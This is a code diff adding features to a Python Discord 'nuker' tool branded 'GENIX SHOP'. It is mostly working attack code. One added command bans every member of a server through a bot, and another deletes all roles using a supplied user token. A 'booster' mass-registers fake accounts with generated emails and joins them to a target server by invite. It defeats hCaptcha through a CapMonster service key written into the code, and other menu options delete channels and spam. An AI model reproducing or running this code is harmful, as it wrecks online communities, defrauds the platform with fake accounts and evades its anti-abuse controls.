@@ -15,7 +15,10 @@ except ImportError:
 	os.system("pip install pystyle")
 	os.system("pip install discord")
 	os.system("pip install capmonster_python")
-	
+
+done = 0
+userID = []
+
 def headers_reg():
     response1 = requests.get("https://discord.com")
     cookie = response1.cookies.get_dict()
@@ -90,6 +93,17 @@ def hcaptcha():
 		time.sleep(2)
 		homepage()
 		
+def hcaptcha2():
+	try:
+		capmonster = HCaptchaTask("bfc4a11b875c449929055ac3a3abc88c")
+		task_id = capmonster.create_task("https://discord.com", "4c672d35-0701-42b2-88c3-78380b0db560")
+		result = capmonster.join_task_result(task_id)
+		return result.get("gRecaptchaResponse")
+	except:
+		print(Colorate.Horizontal(Colors.rainbow, f"               [-] Please check the information and try again !"))
+		time.sleep(2)
+		homepage()
+		
 def token_checker(tokens):
 	headers = {
 		"authorization": tokens
@@ -102,6 +116,50 @@ def token_checker(tokens):
 		clientattack()
 	else:
 		pass
+		
+ban = 0
+
+def get_roles(tokens,server):
+	res = requests.get(f"https://discord.com/api/v9/guilds/{server}",headers={"authorization": tokens})
+	if res.status_code == 200:
+		pass
+	elif res.status_code == 404:
+		print(Colorate.Horizontal(Colors.rainbow, f"             [-] This server could not be found !"))
+		time.sleep(2)
+		clientattack()
+	elif res.status_code == 400:
+		print(Colorate.Horizontal(Colors.rainbow, f"             [-] Invalid server format !"))
+		time.sleep(2)
+		clientattack()
+	elif res.status_code == 401:
+		print(Colorate.Horizontal(Colors.rainbow, f"             [-] An error occurred with your token !"))
+		time.sleep(2)
+		clientattack()
+	else:
+		print(res,res.json())
+	
+		
+def bans(tokens,server,id):
+	global ban
+	r = requests.put(f"https://discord.com/api/v9/guilds/{server}/bans/{id}",json={"delete_message_seconds": 3600},headers={"authorization": "Bot "+ tokens})
+	if r.status_code == 204 or r.status_code == 201 or r.status_code == 200:
+		ban += 1
+		print(Colorate.Horizontal(Colors.rainbow, f"             [*] Member has banned ! || total - {ban} members"))
+	elif r.status_code == 403:
+		print(Colorate.Horizontal(Colors.rainbow, f"             [-] You Missing Permissions !"))
+	elif r.status_code == 404:
+		print(Colorate.Horizontal(Colors.rainbow, f"             [-] This user does not exist on the server !"))
+	else:
+		print(r,r.json())
+	# success - 204 ไม่มี response
+	# 404 guild ที่ไม่รู้จัก code 10004
+	# 404 ผู้ใช้ที่ไม่รู้จัก code 10013
+	# 403 ไม่มีสิทธิ์อนุญาต code 50013
+	# <Response [403]> {'message': 'Missing Permissions', 'code': 50013} = ไม่มีคนให้แบน
+	
+def kicks():
+	r = requests.delete("https://discord.com/api/v9/guilds/1143448217665671228/members/1146004298237489186")
+	# success - 204
 	
 def delete(tk,chann):
 	response = requests.delete(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": f"Bot {tk}"}).json()
@@ -111,10 +169,21 @@ def create(tk,serv,na):
 		response = requests.post(f"https://discord.com/api/v9/guilds/{serv}/channels",headers={"authorization": f"Bot {tk}"},json={"type":0,"name":na,"permission_overwrites":[]})
 	except:
 		pass
+
+rolee = 0
 		
 def delete_roles(tk,guild,r):
 	try:
 		requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": f"Bot {tk}"})
+	except:
+		pass
+		
+def delete_roles2(tk,guild,r):
+	global rolee
+	try:
+		r = requests.delete(f"https://discord.com/api/v9/guilds/{guild}/roles/{r}",headers={"authorization": tk})
+		rolee += 1
+		# <Response [400]> {'message': 'บทบาทไม่ถูกต้อง', 'code': 50028}
 	except:
 		pass
 		
@@ -162,12 +231,12 @@ def clientattack():
 	print()
 	print(Colorate.Diagonal(Colors.rainbow, "                          [G] GET YOUR TOKENS       "))
 	print()
-	print(Colorate.Diagonal(Colors.rainbow, "       [1] DELETE CHANNELS           [7] CHANGE SERVER ( AUTOMATICH )"))
-	print(Colorate.Diagonal(Colors.rainbow, "       [2] CREATE CHANNELS           [8] MEMBERS SERVER BAN ALL"))
-	print(Colorate.Diagonal(Colors.rainbow, "       [3] SPAM MESSAGE ( NUKER )    [9] MEMBERS SERVER KICK ALL"))
-	print(Colorate.Diagonal(Colors.rainbow, "       [4] RENAME SERVER             [10] DELETE ROLES ALL IN SERVER"))
-	print(Colorate.Diagonal(Colors.rainbow, "       [5] RENAME CHANNELS           [11] CHANGE NAME ALL MEMBERS"))
-	print(Colorate.Diagonal(Colors.rainbow, "       [6] CREATE ROLES              [12] TIMEOUT ALL MEMBERS"))
+	print(Colorate.Diagonal(Colors.rainbow, "       [1] DELETE CHANNELS           [7] MEMBERS BOOSTER"))
+	print(Colorate.Diagonal(Colors.rainbow, "       [2] CREATE CHANNELS           [8] DELETE ROLES"))
+	print(Colorate.Diagonal(Colors.rainbow, "       [3] SPAM MESSAGE ( NUKER )    [9] None"))
+	print(Colorate.Diagonal(Colors.rainbow, "       [4] RENAME SERVER             [10] None"))
+	print(Colorate.Diagonal(Colors.rainbow, "       [5] RENAME CHANNELS           [11] None"))
+	print(Colorate.Diagonal(Colors.rainbow, "       [6] CREATE ROLES              [12] None"))
 	print()
 	print(Colorate.Diagonal(Colors.blue_to_red, "                         [00] Back To Home"))
 	print()
@@ -415,7 +484,7 @@ def clientattack():
 		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
 		token_checker(token)
 		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
-		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want automatic spam? (yes,no) : "))
+		type = input(Colorate.Horizontal(Colors.green_to_cyan, "         Do you want automatic change? (yes,no) : "))
 		
 		if type == "Yes" or type == "yes" or type == "Y" or type == "y":
 			try:
@@ -433,14 +502,14 @@ def clientattack():
 					clientattack()
 				else:
 					for i in range(num):
-						x = random.randint(10000000,99999999)
+						x = random.randint(1000,9999)
 						ty = f"GENIX SHOP | {x}"
 						for channel in json.loads(res.text):
 							def startbot(chann,tokens,na):
 								response = requests.patch(f"https://discord.com/api/v9/channels/{chann}",headers={"authorization": tokens},json={"name":na,"type":0,"topic":"","bitrate":64000,"user_limit":0,"nsfw":False,"flags":0,"rate_limit_per_user":0})
 								if response.status_code == 429:
 									re = response.json()['retry_after']
-									print(Colorate.Horizontal(Colors.rainbow, f"             RalteLimited For {re} !"))
+									print(Colorate.Horizontal(Colors.rainbow, f"             [-] RalteLimited For {re} !"))
 									time.sleep(float(re))
 								elif response.status_code == 200:
 									id = response.json()['id']
@@ -528,7 +597,91 @@ def clientattack():
 			
 			time.sleep(3)
 			clientattack()
+	elif select == "7" or select == "07":
+		print()
+		invite = input(Colorate.Horizontal(Colors.green_to_cyan, "         INVITE CODE : "))
 		
+		if invite == "":
+			print()
+			print(Colorate.Horizontal(Colors.rainbow, "             Input must not be empty !"))
+			time.sleep(2)
+			clientattack()
+		else:
+			try:
+				# print(Colorate.Horizontal(Colors.rainbow, "             There are no rooms on this server !"))
+				num = int(input(Colorate.Horizontal(Colors.green_to_cyan, "         NUM : ")))
+				print()
+				
+				def booster():
+					global done
+					s = random.randint(1000,9999)
+					mail = f"eijkH{s}eeozk2902{s}@gmail.com"
+					target = "https://discord.com/api/v9/auth/register"
+					r = requests.post(target,headers=headers_reg(),json={"fingerprint":request_fingerprint(),"email":mail,"username":"GENIX SHOP","password":"As257400","invite":invite,"consent":'true',"date_of_birth":"2000-06-05","gift_code_sku_id":'null',"captcha_key":hcaptcha2(),"promotional_email_opt_in":'true'})
+					if r.status_code == 429:
+						re = r.json()['retry_after']
+						print(Colorate.Horizontal(Colors.rainbow, f"             [-] You stuck raltelimited - {re}"))
+						time.sleep(re)
+						r2 = requests.post(target,headers=headers_reg(),json={"fingerprint":request_fingerprint(),"email":mail,"username":"GENIX SHOP","password":"As257400","invite":invite,"consent":'true',"date_of_birth":"2000-06-05","gift_code_sku_id":'null',"captcha_key":hcaptcha2(),"promotional_email_opt_in":'true'})
+						if r2.status_code == 200 or r2.status_code == 201:
+							done += 1
+							print(Colorate.Horizontal(Colors.rainbow, f"             [+] Member has joined the server ! || round - {done} "))
+						else:
+							return r
+					elif r.status_code == 200 or r.status_code == 201:
+						done += 1
+						print(Colorate.Horizontal(Colors.rainbow, f"             [+] Member has joined the server ! || round - {done} "))
+					else:
+						print(r,r.json())
+					
+				for i in range(num):
+					booster()
+				
+				global done
+				print("\n")
+				input(Colorate.Horizontal(Colors.rainbow, f"         Joined total - {done} members !"))
+				done = 0
+				clientattack()
+			except Exception as f:
+				print(f)
+				print(Colorate.Horizontal(Colors.rainbow, "             The number style is invalid !"))
+				time.sleep(2)
+				clientattack()
+	elif select == "8" or select == "08":
+		print()
+		token = input(Colorate.Horizontal(Colors.green_to_cyan, "         TOKEN : "))
+		token_checker(token)
+		guild = input(Colorate.Horizontal(Colors.green_to_cyan, "         SERVER ID : "))
+		print()
+		
+		if guild == "":
+			clientattack()
+		else:
+			res = requests.get(f"https://discord.com/api/v9/guilds/{guild}",headers={"authorization": token})
+			if res.status_code == 200:
+				roleID = res.json()['roles']
+				for role in roleID:
+					print(Colorate.Horizontal(Colors.rainbow, f"                  [+] Delete Roles ID - {role['id']}"))
+					threading.Thread(target=delete_roles2, args=[token,guild,role['id']]).start()
+				time.sleep(3)
+				global rolee
+				rolee = 0
+				clientattack()
+			elif res.status_code == 404:
+				print(Colorate.Horizontal(Colors.rainbow, f"             [-] This server could not be found !"))
+				time.sleep(2)
+				clientattack()
+			elif res.status_code == 400:
+				print(Colorate.Horizontal(Colors.rainbow, f"             [-] Invalid server format !"))
+				time.sleep(2)
+				clientattack()
+			elif res.status_code == 401:
+				print(Colorate.Horizontal(Colors.rainbow, f"             [-] An error occurred with your token !"))
+				time.sleep(2)
+				clientattack()
+			else:
+				print(res,res.json())
+	
 	
 
 def botattack():
@@ -562,6 +715,7 @@ def botattack():
 		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rc <name> | Change Channels Nickname"))
 		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}auto | Auto Spam Discord Server"))
 		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}close | Close ALL"))
+		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}start | Ban ALL"))
 		print()
 		# ลบห้อง print(Colorate.DiagonalBackwards(Colors.rainbow,f"        [-] Deleted Channels 1143448217665671231 Successfully !", True))
 		
@@ -585,6 +739,7 @@ def botattack():
 		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}rc <name> | Change Channels Nickname"))
 		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}auto | Auto Spam Discord Server"))
 		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}close | Close ALL"))
+		print(Colorate.Horizontal(Colors.green_to_cyan, f"                  {prefix}start | Ban ALL"))
 		print()
 	
 	@bot.command()
@@ -699,6 +854,13 @@ def botattack():
 				threading.Thread(target=create, args=[token,ctx.guild.id,"GENIX SHOP"]).start()
 			except:
 				pass
+				
+	@bot.command()
+	async def start(ctx):
+		await ctx.message.delete()
+		for members in ctx.guild.members:
+			threading.Thread(target=bans, args=[token,ctx.guild.id,members.id]).start()
+			
 		
 	try:
 		bot.run(token)
